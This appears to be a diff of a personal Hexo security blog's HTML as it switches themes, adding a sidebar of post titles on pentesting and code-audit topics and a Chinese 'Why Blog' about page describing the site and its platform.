+            
+        
+    
+        
+            
+            <li><div data-rel="pentest">pentest<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="test">test<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="web">web<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="34">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">博主</span>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.5.0</div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.4.0</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color2">python</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">OD</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">php</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">burpsuite</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">charset</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">proxy</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">mimikatz</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">test</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">msf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">API</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Cobalt Strike</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">activedirectory</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">pte</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">nmap</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
 
+    
+    <nav id="title-list-nav">
         
-
-
-
-
-
-
-
-
-
-
-
-
+        <a  class="code "
+           href="/2018/02/08/150行代码写成的可扩展的代码审计辅助工具/"
+           data-tag="python"
+           data-author="" >
+            <span class="post-title" title="150行代码写成的可扩展的代码审计辅助工具">150行代码写成的可扩展的代码审计辅助工具</span>
+            <span class="post-date" title="2018-02-08 19:18:51">2018/02/08</span>
+        </a>
         
-      </div>
-    </footer>
-  </div>
+        <a  class=""
+           href="/2019/09/16/AD中的黄金票据与白银票据/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="AD中的黄金票据与白银票据">AD中的黄金票据与白银票据</span>
+            <span class="post-date" title="2019-09-16 15:21:50">2019/09/16</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/17/ARP协议详解/"
+           data-tag="python"
+           data-author="" >
+            <span class="post-title" title="ARP协议详解">ARP协议详解</span>
+            <span class="post-date" title="2018-02-17 22:48:20">2018/02/17</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/09/20/ErpnextV12-SSTI-vulnerability/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="ErpnextV12 SSTI vulnerability">ErpnextV12 SSTI vulnerability</span>
+            <span class="post-date" title="2019-09-20 09:57:59">2019/09/20</span>
+        </a>
+        
+        <a  class="reverse "
+           href="/2018/02/07/OD中的各种断点/"
+           data-tag="OD"
+           data-author="" >
+            <span class="post-title" title="OD中的各种断点">OD中的各种断点</span>
+            <span class="post-date" title="2018-02-07 21:27:49">2018/02/07</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/06/PHP使用了PDO的情况下可能产生注入的情况/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="PHP使用了PDO的情况下可能产生注入的情况">PHP使用了PDO的情况下可能产生注入的情况</span>
+            <span class="post-date" title="2018-02-06 16:15:43">2018/02/06</span>
+        </a>
+        
+        <a  class="tools "
+           href="/2018/02/03/burpsuite-Target Spider Scanner Repeater Decoder Comparer模块/"
+           data-tag="burpsuite"
+           data-author="" >
+            <span class="post-title" title="burpsuite-Target Spider Scanner Repeater Decoder Comparer模块">burpsuite-Target Spider Scanner Repeater Decoder Comparer模块</span>
+            <span class="post-date" title="2018-02-03 16:42:20">2018/02/03</span>
+        </a>
+        
+        <a  class="tools "
+           href="/2018/02/02/burpsuite截获流量/"
+           data-tag="burpsuite"
+           data-author="" >
+            <span class="post-title" title="burpsuite截获流量">burpsuite截获流量</span>
+            <span class="post-date" title="2018-02-02 12:18:03">2018/02/02</span>
+        </a>
+        
+        <a  class="linux "
+           href="/2018/04/01/debian解决终端编码报错/"
+           data-tag="charset"
+           data-author="" >
+            <span class="post-title" title="debian解决终端编码报错">debian解决终端编码报错</span>
+            <span class="post-date" title="2018-04-01 16:28:48">2018/04/01</span>
+        </a>
+        
+        <a  class="tools "
+           href="/2018/02/02/burpsuite优化配置/"
+           data-tag="burpsuite"
+           data-author="" >
+            <span class="post-title" title="burpsuite优化配置">burpsuite优化配置</span>
+            <span class="post-date" title="2018-02-02 11:21:57">2018/02/02</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/10/php-ini的不安全配置/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php.ini的不安全配置">php.ini的不安全配置</span>
+            <span class="post-date" title="2018-02-10 21:27:45">2018/02/10</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/07/php代码审计思维导图/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="php代码审计思维导图">php代码审计思维导图</span>
+            <span class="post-date" title="2018-02-07 22:38:10">2018/02/07</span>
+        </a>
+        
+        <a  class="tools "
+           href="/2018/02/03/proxychains配置详解/"
+           data-tag="proxy"
+           data-author="" >
+            <span class="post-title" title="proxychains配置详解">proxychains配置详解</span>
+            <span class="post-date" title="2018-02-03 21:27:08">2018/02/03</span>
+        </a>
+        
+        <a  class="pentest "
+           href="/2019/07/18/mimikatz中的tspkg、MSV1-0、WDigest、kerberos/"
+           data-tag="mimikatz"
+           data-author="" >
+            <span class="post-title" title="mimikatz中的tspkg、MSV1_0、WDigest、kerberos">mimikatz中的tspkg、MSV1_0、WDigest、kerberos</span>
+            <span class="post-date" title="2019-07-18 10:40:27">2019/07/18</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/11/代码审计之SQL注入/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="代码审计之SQL注入">代码审计之SQL注入</span>
+            <span class="post-date" title="2018-02-11 12:45:55">2018/02/11</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/25/代码审计之csrf/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="代码审计之csrf">代码审计之csrf</span>
+            <span class="post-date" title="2018-02-25 21:20:45">2018/02/25</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/23/代码审计之XSS/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="代码审计之XSS">代码审计之XSS</span>
+            <span class="post-date" title="2018-02-23 18:45:18">2018/02/23</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/25/代码审计之文件上传/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="代码审计之文件上传">代码审计之文件上传</span>
+            <span class="post-date" title="2018-02-25 21:21:02">2018/02/25</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/10/代码审计大的思路/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="代码审计大的思路">代码审计大的思路</span>
+            <span class="post-date" title="2018-02-10 21:06:12">2018/02/10</span>
+        </a>
+        
+        <a  class="reverse "
+           href="/2018/02/08/反调试之IsDebuggerPresent/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="反调试之IsDebuggerPresent">反调试之IsDebuggerPresent</span>
+            <span class="post-date" title="2018-02-08 17:19:20">2018/02/08</span>
+        </a>
+        
+        <a  class="reverse "
+           href="/2018/02/10/反调试之检测进程名/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="反调试之检测进程名">反调试之检测进程名</span>
+            <span class="post-date" title="2018-02-10 11:01:26">2018/02/10</span>
+        </a>
+        
+        <a  class="reverse "
+           href="/2018/02/13/反调试之检测标题名和类名/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="反调试之检测标题名和类名">反调试之检测标题名和类名</span>
+            <span class="post-date" title="2018-02-13 10:27:39">2018/02/13</span>
+        </a>
+        
+        <a  class="test "
+           href="/2019/07/17/备份恢复测试/"
+           data-tag="test"
+           data-author="" >
+            <span class="post-title" title="备份恢复测试">备份恢复测试</span>
+            <span class="post-date" title="2019-07-17 11:42:56">2019/07/17</span>
+        </a>
+        
+        <a  class="tools "
+           href="/2018/02/08/网页表单调用以外的钓鱼方法/"
+           data-tag="msf"
+           data-author="" >
+            <span class="post-title" title="网页表单调用以外的钓鱼方法">网页表单调用以外的钓鱼方法</span>
+            <span class="post-date" title="2018-02-08 19:12:52">2018/02/08</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/09/18/进程保护技术学习和总结/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="进程保护技术学习和总结">进程保护技术学习和总结</span>
+            <span class="post-date" title="2019-09-18 10:27:17">2019/09/18</span>
+        </a>
+        
+        <a  class="reverse "
+           href="/2018/02/10/隐式地调用系统API/"
+           data-tag="API"
+           data-author="" >
+            <span class="post-title" title="隐式地调用系统API">隐式地调用系统API</span>
+            <span class="post-date" title="2018-02-10 19:55:54">2018/02/10</span>
+        </a>
+        
+        <a  class="pentest "
+           href="/2019/07/17/MalleableC2总结/"
+           data-tag="Cobalt Strike"
+           data-author="" >
+            <span class="post-title" title="MalleableC2总结">MalleableC2总结</span>
+            <span class="post-date" title="2019-07-17 13:14:20">2019/07/17</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/19/代码审计之命令执行/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="代码审计之命令执行">代码审计之命令执行</span>
+            <span class="post-date" title="2018-02-19 15:36:11">2018/02/19</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/19/代码审计之代码执行/"
+           data-tag="php"
+           data-author="" >
+            <span class="post-title" title="代码审计之代码执行">代码审计之代码执行</span>
+            <span class="post-date" title="2018-02-19 15:34:35">2018/02/19</span>
+        </a>
+        
+        <a  class="code "
+           href="/2018/02/18/以太网协议详解/"
+           data-tag="python"
+           data-author="" >
+            <span class="post-title" title="以太网协议详解">以太网协议详解</span>
+            <span class="post-date" title="2018-02-18 21:02:34">2018/02/18</span>
+        </a>
+        
+        <a  class="pentest "
+           href="/2019/07/17/域内信息收集/"
+           data-tag="activedirectory"
+           data-author="" >
+            <span class="post-title" title="域内信息收集">域内信息收集</span>
+            <span class="post-date" title="2019-07-17 12:47:58">2019/07/17</span>
+        </a>
+        
+        <a  class="web "
+           href="/2018/02/04/http协议详解/"
+           data-tag="pte"
+           data-author="" >
+            <span class="post-title" title="http协议详解">http协议详解</span>
+            <span class="post-date" title="2018-02-04 19:06:57">2018/02/04</span>
+        </a>
+        
+        <a  class="pentest "
+           href="/2019/09/06/利用External-C2让内网机器在Cobalt-Strike中上线/"
+           data-tag="Cobalt Strike"
+           data-author="" >
+            <span class="post-title" title="利用External C2让内网机器在Cobalt Strike中上线">利用External C2让内网机器在Cobalt Strike中上线</span>
+            <span class="post-date" title="2019-09-06 09:18:29">2019/09/06</span>
+        </a>
+        
+        <a  class="tools "
+           href="/2018/01/31/nmap-7-6-手册/"
+           data-tag="nmap"
+           data-author="" >
+            <span class="post-title" title="nmap 7.6 手册">nmap 7.6 手册</span>
+            <span class="post-date" title="2018-01-31 15:09:23">2018/01/31</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post index">
+    <div class="pjax">
+        <article class="index">
+            <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Why-Blog"><span class="toc-text">Why Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#对博客的理解"><span class="toc-text">对博客的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于叶落阁"><span class="toc-text">关于叶落阁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#博客平台"><span class="toc-text">博客平台</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+            <h1 id="Why-Blog"><a href="#Why-Blog" class="headerlink" title="Why Blog"></a>Why Blog</h1><h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p>喜欢写Blog的人，会经历三个阶段。</p>
+<blockquote>
+<p>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</p>
+<p>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</p>
+<p>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</p>
+</blockquote>
+<p>我们每个人的在网络上产生的数据越来越多，这些信息是我们在互联网上存在过的痕迹，值得我们认真对待。但是它们被分散分布在各个网站上。很多时候我们很难将它们聚合在一起，而且各个网站的信息排布方式也没有办法自由控制，所以我们需要一个可以由自己主宰的空间——博客。</p>
+<p>通过博客，我们可以记录自己的生活和成长的轨迹。它不像 Twitter 那样碎片化，也不像 Facebook 那样关系化，它是私人的空间。</p>
+<h2 id="关于叶落阁"><a href="#关于叶落阁" class="headerlink" title="关于叶落阁"></a>关于叶落阁</h2><p><strong>叶落阁</strong> 是阿杰（杨玉杰）的个人站。</p>
+<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
+<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
+<h2 id="博客平台"><a href="#博客平台" class="headerlink" title="博客平台"></a>博客平台</h2><p>这个博客通过 <a href="https://hexo.io/">Hexo</a> 生成，部署在 <a href="https://pages.github.com/">GitHub Pages</a>，主题 <a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a> 已经在github上开源</p>
+<p>主要功能：</p>
+<ul>
+<li>搜索支持文章标题、标签(#标签)、作者(@作者)</li>
+<li>pad/手机等移动端适配</li>
+<li>页面全局快捷键 <a href='http://yelog.org/2017/03/24/3-hexo-shortcuts/'>3-hexo快捷键说明</a></li>
+</ul>
 
-  
+        </article>
+        
+        <p>
+            <a  class="dashang" onclick="dashangToggle()">赏</a>
+        </p>
+        
+        
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2016-2019 Yelog</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
 
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
 
-  <script src="/lib/anime.min.js?v=3.1.0"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
-<script src="/js/schemes/muse.js?v=7.4.0"></script>
-<script src="/js/next-boot.js?v=7.4.0"></script>
+    </div>
+</div>
+<a class="" id="rocket" ></a>
 
+    </div>
+</div>
+<div class="acParent"></div>
 
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
 
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
 
 </body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#python','#OD','#php','#burpsuite','#charset','#proxy','#mimikatz','#test','#msf','#API','#Cobalt Strike','#activedirectory','#pte','#nmap',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
 </html>
